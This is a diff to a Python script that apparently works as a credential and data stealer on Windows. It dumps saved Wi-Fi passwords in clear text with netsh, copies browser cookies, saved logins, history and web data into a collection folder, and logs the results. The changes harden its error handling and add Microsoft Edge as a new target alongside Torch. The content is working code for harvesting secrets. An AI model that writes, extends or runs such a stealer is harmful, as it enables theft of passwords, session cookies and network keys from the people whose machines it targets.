@@ -134,9 +134,16 @@ try:
                         print(" 	 Wi-Fi's [")
                     logfile.write("\n	 Wi-Fi's [\n")
                     for i in profiles:
-                        results = subprocess.check_output(["netsh", "wlan", "show", "profile", i, "key=clear"]).decode(
-                            encoding).split("\n")
-                        results = [b.split(":")[1][1:-1] for b in results if two in b]
+                        try:
+                            results = subprocess.check_output(
+                                ["netsh", "wlan", "show", "profile", i, "key=clear"]).decode(
+                                encoding).split("\n")
+                            results = [b.split(":")[1][1:-1] for b in results if two in b]
+                        except Exception as netex:
+                            results = ["(error, bad encoding)"]
+                            if ("{+} networkpass --> " + str(netex)) not in erlist:
+                                erlist.append("{+} networkpass --> " + str(netex))
+                            pass
                         try:
                             if "-q" not in str(sys.argv):
                                 print("	   {0}:{1}".format(i, results[0]))
@@ -146,9 +153,11 @@ try:
                             if "-q" not in str(sys.argv):
                                 print("	   {0}:{1}".format(i, ""))
                             logfile.write("		{0}:{1}\n".format(i, ""))
+                            pass
 
                 except Exception as netex:
-                    erlist.append("{+} networkpass --> " + str(netex))
+                    if ("{+} networkpass --> " + str(netex)) not in erlist:
+                        erlist.append("{+} networkpass --> " + str(netex))
                     pass
 
 
@@ -565,6 +574,26 @@ try:
                         if findone("Login Data", src, "\\Torch\\"):
                             checkp(" 	 + Login Data")
                         if findone("Web Data", src, "\\Torch\\"):
+                            checkp(" 	 + Web Data")
+                    except Exception as exx:
+                        print(exx)
+
+                if os.path.exists("C:/Users/{0}/AppData/Local/Microsoft/Edge/User Data/Default/".format(user)):
+                    src = "C:/Users/{0}/AppData/Local/Microsoft/Edge/User Data/Default/".format(user)
+                    if os.path.exists(dio + "\\Microsoft Edge"):
+                        shutil.rmtree(dio + "\\Microsoft Edge")
+                    os.makedirs(dio + "\\Microsoft Edge")
+                    checkp(" 	{~} Microsoft Edge:")
+                    try:
+                        if findone("Cookies", src, "\\Microsoft Edge\\"):
+                            checkp(" 	 + Cookies")
+                        if findone("Bookmarks", src, "\\Microsoft Edge\\"):
+                            checkp(" 	 + Bookmarks")
+                        if findone("History", src, "\\Microsoft Edge\\"):
+                            checkp(" 	 + History")
+                        if findone("Login Data", src, "\\Microsoft Edge\\"):
+                            checkp(" 	 + Login Data")
+                        if findone("Web Data", src, "\\Microsoft Edge\\"):
                             checkp(" 	 + Web Data")
                     except Exception as exx:
                         print(exx)
